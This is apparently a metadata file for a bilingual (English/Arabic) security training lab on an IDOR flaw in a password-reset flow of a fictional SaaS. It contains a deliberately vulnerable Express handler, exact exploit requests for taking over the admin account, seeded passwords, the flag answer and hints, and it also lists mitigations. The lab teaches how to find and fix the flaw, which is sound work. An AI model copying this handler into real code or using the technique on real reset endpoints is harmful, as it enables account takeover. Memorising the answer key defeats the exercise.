// src/modules/practice-labs/idor/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const idorLab3Metadata: LabMetadata = {
  slug: 'idor-password-reset-flow',
  canonicalConceptId: 'idor-account-takeover',
  environmentType: 'PORTAL_AUTH',
  title: 'IDOR: Password Reset — Account Takeover via userId Manipulation',
  ar_title: 'IDOR: إعادة تعيين كلمة المرور — الاستيلاء على الحساب عبر التلاعب بـ userId',
  description:
    "Exploit an IDOR vulnerability in the password reset flow where the reset endpoint accepts a userId parameter directly, allowing you to reset any account's password — including the admin account.",
  ar_description:
    'استغل ثغرة IDOR في تدفق إعادة تعيين كلمة المرور حيث يقبل endpoint إعادة التعيين معامل userId مباشرة، مما يتيح لك إعادة تعيين كلمة مرور أي حساب بما فيه حساب المسؤول.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: ['IDOR', 'Account Takeover', 'Password Reset Abuse', 'Authentication Bypass'],
  xpReward: 250,
  pointsReward: 125,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  missionBrief: {
    codename: 'OPERATION GHOST LOGIN',
    classification: 'SECRET',
    objective: 'Abuse the CloudBase SaaS password reset flow to take over the admin account by manipulating the targetUserId parameter while using your own valid reset token.',
    ar_objective: 'استغل تدفق إعادة تعيين كلمة المرور في CloudBase SaaS للاستيلاء على حساب الأدمن عبر التلاعب بمعامل targetUserId بينما تستخدم رمز إعادة تعيين صالح خاص بك.',
    successCriteria: ['Login as admin_cloudbase with your injected password and retrieve the flag from the admin profile.'],
    ar_successCriteria: ['سجّل الدخول كـ admin_cloudbase بكلمة مرورك المحقونة واسترجع العلم من ملف تعريف الأدمن.'],
  },
  labInfo: {
    vulnType: 'IDOR — Account Takeover via Password Reset',
    cweId: 'CWE-640',
    cvssScore: 9.1,
    description: 'Password reset flows can be exploited via IDOR if userId is supplied by the client instead of being derived from the reset token server-side.',
    ar_description: 'يمكن استغلال تدفقات إعادة تعيين كلمة المرور عبر IDOR إذا كان userId مُقدَّماً من العميل بدلاً من اشتقاقه من رمز إعادة التعيين من جانب الخادم.',
    whatYouLearn: [
      'How password reset flows can be exploited via IDOR if userId is client-supplied',
      'Why reset tokens must bind userId server-side, never from request body',
      'Account takeover without brute force or phishing',
      'Mitigation: token-bound userId + one-time invalidation',
    ],
    ar_whatYouLearn: [
      'كيف يمكن استغلال تدفقات إعادة تعيين كلمة المرور عبر IDOR إذا كان userId مقدَّماً من العميل',
      'لماذا يجب ربط رموز إعادة التعيين بـ userId من جانب الخادم، وليس من جسم الطلب',
      'الاستيلاء على الحساب بدون قوة غاشمة أو تصيد',
      'التخفيف: userId مرتبط بالرمز + إلغاء لمرة واحدة',
    ],
    techStack: ['REST API', 'Node.js', 'JWT', 'Password Reset Flow'],
    references: [
      { label: 'OWASP Forgot Password Cheat Sheet', url: 'https://owasp.org/www-community/attacks/Forgot_Password_Cheat_Sheet' },
      { label: 'OWASP Forgot Password Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html' },
      { label: 'CWE-640', url: 'https://cwe.mitre.org/data/definitions/640.html' },
    ],
  },
  goal: "Trigger a password reset for your own account, intercept the reset token, then manipulate the userId parameter in the /reset-password endpoint to reset the admin account's password instead.",
  ar_goal: 'افعّل إعادة تعيين كلمة مرور لحسابك الخاص، التقط رمز إعادة التعيين، ثم تلاعب بمعامل userId في /reset-password لإعادة تعيين كلمة مرور حساب الأدمن بدلاً من ذلك.',
  briefing: {
    en: `CloudBase SaaS — multi-tenant cloud platform. Thousands of companies. Thousands of users. You are user_john. Standard account. No admin access. You click "Forgot Password." A reset email. A token. Standard practice. You receive the token. The reset form has two fields: new password. Confirm password. But you inspect the POST request. Three fields: token, newPassword — and targetUserId. The token is yours. Valid for user_john. You change targetUserId to admin_cloudbase. The server validates the token. Token is valid? ✓ Now it resets the password for — whoever targetUserId says. Not who the token was issued for. Whoever you told it.`,
    ar: `CloudBase SaaS — منصة سحابية متعددة المستأجرين. آلاف الشركات. آلاف المستخدمين. أنت user_john. حساب قياسي. لا صلاحيات أدمن. تنقر على "نسيت كلمة المرور." بريد إعادة تعيين. رمز. ممارسة قياسية. تتلقى الرمز. نموذج إعادة التعيين له حقلان: كلمة المرور الجديدة. التأكيد. لكنك تفحص طلب POST. ثلاثة حقول: token، newPassword — وtargetUserId. الرمز ملكك. صالح لـ user_john. تغير targetUserId إلى admin_cloudbase. الخادم يتحقق من الرمز. الرمز صالح؟ ✓ الآن يعيد تعيين كلمة المرور لـ — أياً كان ما يقوله targetUserId.`,
  },
  stepsOverview: {
    en: [
      'Request a password reset for user_john — receive a valid reset token',
      'Inspect the /reset-password endpoint request — note the targetUserId field',
      'Understand the vulnerability: token is validated but bound to the wrong user',
      'Resend the reset request with your valid token but targetUserId: "admin_cloudbase"',
      'Login as admin_cloudbase with your new password — retrieve the flag',
    ],
    ar: [
      'اطلب إعادة تعيين كلمة مرور لـ user_john — احصل على رمز إعادة تعيين صالح',
      'افحص طلب endpoint /reset-password — لاحظ حقل targetUserId',
      'افهم الثغرة: الرمز مُتحقَّق منه لكن مرتبط بالمستخدم الخطأ',
      'أعد إرسال طلب إعادة التعيين بالرمز الصالح الخاص بك لكن مع targetUserId: "admin_cloudbase"',
      'سجّل الدخول كـ admin_cloudbase بكلمة مرورك الجديدة — استرجع العلم',
    ],
  },
  solution: {
    context:
      "CloudBase /reset-password endpoint validates the reset token format and expiry, but uses the targetUserId from the REQUEST BODY (not from the stored token record) to determine which account to reset.",
    vulnerableCode:
      '// Password reset (vulnerable):\n' +
      "app.post('/reset-password', async (req, res) => {\n" +
      '  const { token, targetUserId, newPassword } = req.body;\n' +
      '  const resetRecord = await db.resetTokens.findOne({ token });\n' +
      "  if (!resetRecord || resetRecord.expired) return res.status(400).json({ error: 'Invalid token' });\n" +
      '  // ❌ Uses userId from REQUEST BODY, not from the token record!\n' +
      '  await db.users.update({ id: targetUserId, password: hash(newPassword) });\n' +
      '  res.json({ success: true });\n' +
      '});',
    exploitation:
      '1. POST /auth/forgot-password { "username": "user_john" } → get reset token\n' +
      '2. POST /auth/reset-password { "token": "<token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" }\n' +
      '3. POST /auth/login { "username": "admin_cloudbase", "password": "hacked123" } → admin JWT → flag in profile',
    steps: {
      en: [
        'POST /auth/forgot-password { "username": "user_john" } → reset initiated',
        'GET /auth/get-token → lab simulation returns your reset token',
        'POST /auth/reset-password { "token": "<token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" } → 200 OK',
        'POST /auth/login { "username": "admin_cloudbase", "password": "hacked123" } → admin JWT token returned',
        'GET /auth/profile with admin JWT → flag: FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
      ],
      ar: [
        'POST /auth/forgot-password { "username": "user_john" } → بدأت إعادة التعيين',
        'GET /auth/get-token → محاكاة المختبر تُعيد رمز إعادة التعيين الخاص بك',
        'POST /auth/reset-password { "token": "<token>"، "targetUserId": "admin_cloudbase"، "newPassword": "hacked123" } → 200 OK',
        'POST /auth/login { "username": "admin_cloudbase"، "password": "hacked123" } → رمز JWT للأدمن مُعاد',
        'GET /auth/profile مع JWT الأدمن → العلم: FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
      ],
    },
    fix: [
      'Never accept userId from the request body in password reset — use only the userId embedded in the token record stored in the database',
      'Correct pattern: const { userId } = await db.resetTokens.findOne({ token }) — trust the token, not the request',
      'One-time tokens: invalidate the token immediately after use',
      'Rate limit: maximum 3 reset attempts per email per hour',
    ],
  },
  postSolve: {
    explanation: {
      en: 'This is a variant of IDOR in sensitive account workflows. The token proves identity but the user ID determines the target. Separating these two concerns and trusting the client-supplied userId is a critical design error.',
      ar: 'هذا نوع من IDOR في تدفقات الحسابات الحساسة. الرمز يثبت الهوية لكن معرف المستخدم يحدد الهدف. فصل هاتين المسألتين والوثوق بـ userId المُقدَّم من العميل هو خطأ تصميمي حرج.',
    },
    impact: {
      en: 'Complete account takeover for any user on the platform including admin. One valid reset token for any account is enough to compromise any other account.',
      ar: 'استيلاء كامل على الحساب لأي مستخدم بما فيه الأدمن. رمز إعادة تعيين صالح واحد لأي حساب يكفي لاختراق أي حساب آخر.',
    },
    fix: [
      'Token-bound userId: store { token, userId, expiry } — the userId is only read FROM the database record',
      'Invalidate immediately: delete the token record after successful password reset',
      'Notify original owner: send security alert email to the token legitimate owner',
      'Audit: log every password reset attempt with token, requested userId, and source IP',
    ],
  },
  hints: [
    { order: 1, xpCost: 15, ar_content: 'اطلب إعادة تعيين كلمة مرور لـ user_john. تحصل على رمز إعادة تعيين. افحص جسم طلب إعادة التعيين — يوجد حقل "targetUserId" إلى جانب الرمز.', content: 'Request a password reset for user_john. You receive a reset token. Inspect the reset request body — there is a "targetUserId" field alongside the token.' },
    { order: 2, xpCost: 30, ar_content: 'رمزك صالح لـ user_john. ماذا لو احتفظت بنفس الرمز الصالح لكن غيّرت targetUserId إلى "admin_cloudbase"؟ هل يتحقق الخادم من صاحب الرمز فعلاً؟', content: 'Your token is valid for user_john. What if you keep the same valid token but change targetUserId to "admin_cloudbase"? Does the server check whose token it really is?' },
    { order: 3, xpCost: 55, ar_content: 'POST /auth/reset-password مع { "token": "<token>"، "targetUserId": "admin_cloudbase"، "newPassword": "hacked123" } — ثم سجّل الدخول بتلك البيانات للحصول على العلم.', content: 'POST /auth/reset-password with { "token": "<token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" } — then login with those credentials to get the flag.' },
  ],
  flagAnswer: 'FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
  initialState: {
    users: [
      { username: 'user_john', password: 'john123', role: 'user', email: 'john@cloudbase.io' },
      { username: 'admin_cloudbase', password: 'ADM1N_CL0UD_S3CR3T!', role: 'admin', email: 'admin@cloudbase.io' },
    ],
  },
};
